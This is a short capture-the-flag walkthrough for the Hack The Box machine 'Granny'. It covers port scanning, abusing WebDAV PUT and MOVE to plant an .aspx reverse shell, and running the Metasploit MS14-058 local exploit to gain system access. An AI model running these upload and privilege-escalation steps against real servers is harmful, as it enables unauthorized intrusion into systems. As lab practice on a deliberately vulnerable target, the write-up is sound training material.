# [Granny](https://app.hackthebox.com/machines/granny)

```bash
nmap -p- --min-rate 10000  10.10.10.15 -Pn
```

![Alt text](img/image.png)

After knowing open port (80), we can do more greater nmap scan.

```bash
nmap -A -sC -sV -p80 10.10.10.15 -Pn 
```

![Alt text](img/image-1.png)


I see that it's also 'Webdav' , that's why let's test which type of files we can upload.

For this , I use `davtest` command.

![Alt text](img/image-2.png)


I see that, .txt files are allowed, let's try ourselves.

```bash
echo "Dr4ks is here" > test.txt
curl -X PUT http://10.10.10.15/test.txt -d @test.txt
curl http://10.10.10.15/test.txt
```


![Alt text](img/image-3.png)


From allowed methods, I see that `MOVE` HTTP method is allowed, that's why I can replace any txt file with my malicious reverse shell whose extension is `.aspx`.


First, let's generate our malicious reverse shell with aspx file extension.

![Alt text](img/image-4.png)

Then, we upload our malicous file as legitimate.

![Alt text](img/image-5.png)


Then, we do 'MOVE' method for resolving real .aspx file.

![Alt text](img/image-6.png)


We got reverse shell from listener while we browse our malicious file via `curl` command.

![Alt text](img/image-7.png)

![Alt text](img/image-8.png)


While doing enumeration, I see that I need to do privilege escalation, from `systeminfo` command result.

This machine is vulnerable to `MS14-058` vulnerability.

Let's stay our reverse shell session on background via `Ctrl+Z` command use this exploit.

```bash
Ctrl+ Z
use exploit/windows/local/ms14_058_track_popup_menu 
set session 1
run
```

![Alt text](img/image-9.png)


user.txt

![Alt text](img/image-10.png)


root.txt

![Alt text](img/image-11.png)

